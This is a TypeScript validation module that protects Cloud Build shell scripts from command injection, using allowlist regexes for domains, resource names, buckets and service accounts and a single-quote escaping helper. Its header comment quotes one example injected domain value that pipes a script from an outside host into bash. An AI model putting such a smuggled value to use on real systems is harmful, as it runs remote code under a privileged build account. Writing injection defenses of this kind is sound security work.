/**
 * Input validation for values that are interpolated into shell commands.
 *
 * WHY THIS EXISTS
 * ---------------
 * Several Cloud Build steps run `bash -c` with a script assembled by template
 * literal, e.g.:
 *
 *     gcloud compute ssl-certificates create $CERT_NAME --domains=${customDomain}
 *
 * `customDomain` and `serviceName` come straight from `<input>` elements with
 * no validation. A value such as:
 *
 *     example.com --domains=x; curl https://untrusted.example.com/s.sh | bash; #
 *
 * executes arbitrary commands inside Cloud Build, using the build service
 * account -- which in most projects has broad project-level permissions.
 *
 * STRATEGY
 * --------
 * Allowlist validation, not escaping. A value that matches a strict DNS
 * hostname or GCP resource-name pattern cannot contain a shell metacharacter,
 * because those patterns permit only [a-z0-9], '-' and '.'. This is provably
 * safe and, unlike rewriting the scripts, cannot break the gcloud logic.
 *
 * Validate at the boundary, before any script is assembled.
 *
 * WHEN ALLOWLISTING DOES NOT FIT
 * ------------------------------
 * Some values are legitimately free-form -- environment variable values may be
 * URLs, `gs://` paths, dotted model names or API keys. No hostname or
 * resource-name pattern can accept those without also accepting shell
 * metacharacters. For that case, and ONLY that case, use `shellSingleQuote`
 * below, which is safe precisely because a single-quoted POSIX shell string
 * performs no expansion at all.
 */

/**
 * Wraps a value in POSIX single quotes so a shell treats it as a literal.
 *
 * Inside single quotes a POSIX shell performs NO expansion whatsoever -- no
 * `$VAR`, no `$(...)`, no backticks, no globbing. The only character that
 * cannot appear is `'` itself, which is handled by closing the quote, emitting
 * an escaped quote, and reopening: `'` becomes `'\''`.
 *
 * Example: `a'b$(id)` becomes `'a'\''b$(id)'`, which the shell reads back as
 * the literal seven-plus characters `a'b$(id)`.
 *
 * Use this only for genuinely free-form values. For structured values such as
 * hostnames and resource names, prefer the allowlist validators above: they
 * reject bad input outright rather than neutralizing it.
 */
export const shellSingleQuote = (value: string): string => {
  const asString = value === null || value === undefined ? "" : String(value);
  return `'${asString.replace(/'/g, `'\\''`)}'`;
};

/**
 * A DNS hostname: lowercase labels of alphanumerics and hyphens, separated by
 * dots, at least two labels, 253 characters maximum, no leading or trailing
 * hyphen in any label.
 */
export const HOSTNAME_PATTERN =
  /^(?=.{1,253}$)[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/;

/**
 * A GCP resource name (Cloud Run services, DNS zones, compute resources):
 * starts with a lowercase letter, then lowercase alphanumerics and hyphens,
 * 63 characters maximum, no trailing hyphen.
 */
export const GCP_RESOURCE_NAME_PATTERN = /^[a-z]([-a-z0-9]{0,61}[a-z0-9])?$/;

/** Characters that carry meaning to a shell. Used for diagnostics only. */
const SHELL_METACHARACTERS = /[;&|`$(){}[\]<>\\'"\n\r\t*?!#~ ]/;

/**
 * Normalizes a hostname for validation: trims surrounding whitespace, lowercases,
 * and drops a single trailing dot (`example.com.` is a legal FQDN form).
 *
 * Note this is normalization, not sanitization. It never removes dangerous
 * characters -- anything unexpected still fails validation below.
 */
export const normalizeHostname = (value: string): string =>
  typeof value === "string" ? value.trim().toLowerCase().replace(/\.$/, "") : "";

/** True when `value` is a syntactically valid, shell-safe DNS hostname. */
export const isValidHostname = (value: string): boolean => {
  if (typeof value !== "string") return false;
  const normalized = normalizeHostname(value);
  if (!normalized) return false;
  return HOSTNAME_PATTERN.test(normalized);
};

/** True when `value` is a valid, shell-safe GCP resource name. */
export const isValidGcpResourceName = (value: string): boolean => {
  if (typeof value !== "string") return false;
  return GCP_RESOURCE_NAME_PATTERN.test(value.trim());
};

/**
 * True when `value` contains any character a shell would treat specially.
 *
 * This is a diagnostic aid for error messages and tests. It is deliberately NOT
 * the security control -- denylisting metacharacters is fragile. The allowlist
 * patterns above are the control.
 */
export const containsShellMetacharacters = (value: string): boolean =>
  typeof value === "string" && SHELL_METACHARACTERS.test(value);

/**
 * Throws unless `value` is a shell-safe hostname.
 *
 * @param value     the candidate hostname
 * @param fieldName human-readable field name, used in the error message
 * @returns         the normalized (trimmed, lowercased) hostname
 */
export const assertValidHostname = (
  value: string,
  fieldName = "Custom domain",
): string => {
  if (!isValidHostname(value)) {
    throw new Error(
      `${fieldName} is not a valid domain name: "${value}". ` +
        `Expected something like "ai.yourcompany.com" -- only lowercase letters, ` +
        `numbers, hyphens and dots are allowed.`,
    );
  }
  return normalizeHostname(value);
};

/**
 * An opaque identifier supplied by a Google API (widget config IDs, engine IDs,
 * UUIDs): alphanumerics, hyphens and underscores only.
 */
export const OPAQUE_ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/;

/**
 * A GCP service account email.
 *
 * Deliberately broader than the user-managed `*.iam.gserviceaccount.com` form,
 * because Google-managed accounts are legitimate values here:
 *   my-sa@my-project.iam.gserviceaccount.com
 *   123456789012-compute@developer.gserviceaccount.com
 *   123456789012@cloudbuild.gserviceaccount.com
 *
 * Every character admitted -- [a-z0-9._-] and '@' -- is inert to a shell.
 *
 * Note this is intentionally NOT an RFC 5321 email validator. RFC 5321 permits
 * characters such as bang, hash, dollar, ampersand, apostrophe, asterisk,
 * slash, equals, question mark, caret, backtick, braces, pipe and tilde in the
 * local part -- every one of which is shell-dangerous.
 */
export const SERVICE_ACCOUNT_EMAIL_PATTERN =
  /^[a-z0-9][-a-z0-9._]{0,62}@[a-z0-9][-a-z0-9.]{0,62}\.gserviceaccount\.com$/;

/**
 * A GCP project identifier: either a project ID (`my-project-123`) or a
 * project number (`123456789012`).
 *
 * Both forms must be accepted. gcloud takes either, and several screens seed
 * the field from a numeric project number -- rejecting digits would break
 * deployments that work today.
 */
export const PROJECT_IDENTIFIER_PATTERN = /^(?:[a-z][-a-z0-9]{4,28}[a-z0-9]|\d{1,20})$/;

/**
 * A GCS bucket name. Permits dots (domain-named buckets) and underscores,
 * neither of which is covered by the hostname or opaque-id patterns alone.
 */
export const BUCKET_NAME_PATTERN = /^[a-z0-9][a-z0-9._-]{1,61}[a-z0-9]$/;

/** True when `value` is a shell-safe opaque identifier. */
export const isValidOpaqueId = (value: string): boolean =>
  typeof value === "string" && OPAQUE_ID_PATTERN.test(value.trim());

/** True when `value` is a shell-safe GCP service account email. */
export const isValidServiceAccountEmail = (value: string): boolean =>
  typeof value === "string" &&
  SERVICE_ACCOUNT_EMAIL_PATTERN.test(value.trim().toLowerCase());

/** True when `value` is a shell-safe GCP project ID or project number. */
export const isValidProjectIdentifier = (value: string): boolean =>
  typeof value === "string" && PROJECT_IDENTIFIER_PATTERN.test(value.trim());

/**
 * True when `value` is a shell-safe GCS bucket name (no `gs://` prefix).
 *
 * Note this does NOT lowercase before testing. GCS bucket names are required
 * to be lowercase, so `My-Bucket` is genuinely invalid -- rejecting it here
 * produces a clear browser-side message instead of an obscure gcloud failure
 * inside Cloud Build. (Lowercasing first would also have been misleading,
 * since this module returns the original value, not the normalized one.)
 */
export const isValidBucketName = (value: string): boolean =>
  typeof value === "string" && BUCKET_NAME_PATTERN.test(value.trim());

/**
 * Throws unless `value` is a shell-safe opaque identifier.
 *
 * These values come from Google APIs rather than the user, so they are far
 * less likely to be hostile -- but they are still interpolated into `bash -c`
 * scripts, and "the API would never return that" is not a security control.
 *
 * @returns the trimmed identifier
 */
export const assertValidOpaqueId = (
  value: string,
  fieldName = "Identifier",
): string => {
  if (!isValidOpaqueId(value)) {
    throw new Error(
      `${fieldName} has an unexpected format: "${value}". ` +
        `Only letters, numbers, hyphens and underscores are allowed.`,
    );
  }
  return value.trim();
};

/**
 * Throws unless `value` is a shell-safe service account email.
 *
 * @returns the trimmed, lowercased email
 */
export const assertValidServiceAccountEmail = (
  value: string,
  fieldName = "Service account",
): string => {
  if (!isValidServiceAccountEmail(value)) {
    throw new Error(
      `${fieldName} is not a valid service account email: "${value}". ` +
        `Expected something like "my-sa@my-project.iam.gserviceaccount.com".`,
    );
  }
  return value.trim().toLowerCase();
};

/**
 * Throws unless `value` is a shell-safe project ID or project number.
 *
 * @returns the trimmed identifier
 */
export const assertValidProjectIdentifier = (
  value: string,
  fieldName = "Project ID",
): string => {
  if (!isValidProjectIdentifier(value)) {
    throw new Error(
      `${fieldName} is not a valid Google Cloud project ID or number: "${value}". ` +
        `Expected something like "my-project-123" or "123456789012".`,
    );
  }
  return value.trim();
};

/**
 * Throws unless `value` is a shell-safe GCS bucket name.
 *
 * Accepts an optional `gs://` prefix and an optional trailing object path;
 * every path segment is validated, so a passing value contains no shell
 * metacharacter anywhere.
 *
 * @returns the trimmed original value
 */
export const assertValidBucketPath = (
  value: string,
  fieldName = "Bucket",
): string => {
  const trimmed = typeof value === "string" ? value.trim() : "";
  const withoutScheme = trimmed.replace(/^gs:\/\//i, "");
  const segments = withoutScheme.split("/").filter((s) => s.length > 0);

  if (segments.length === 0) {
    throw new Error(`${fieldName} is empty or malformed: "${value}".`);
  }
  const [bucket, ...pathSegments] = segments;
  if (!isValidBucketName(bucket)) {
    throw new Error(
      `${fieldName} is not a valid Cloud Storage bucket name: "${bucket}". ` +
        `Expected something like "my-bucket" or "gs://my-bucket/path".`,
    );
  }
  for (const segment of pathSegments) {
    if (!isValidOpaqueId(segment) && !isValidBucketName(segment)) {
      throw new Error(
        `${fieldName} contains an unsupported path segment: "${segment}". ` +
          `Only letters, numbers, dots, hyphens and underscores are allowed.`,
      );
    }
  }
  return trimmed;
};

/**
 * Throws unless `value` is a shell-safe GCP resource name.
 *
 * @returns the trimmed resource name
 */
export const assertValidGcpResourceName = (
  value: string,
  fieldName = "Service name",
): string => {
  if (!isValidGcpResourceName(value)) {
    throw new Error(
      `${fieldName} is not a valid Google Cloud resource name: "${value}". ` +
        `It must start with a lowercase letter and contain only lowercase ` +
        `letters, numbers and hyphens (63 characters maximum).`,
    );
  }
  return value.trim();
};
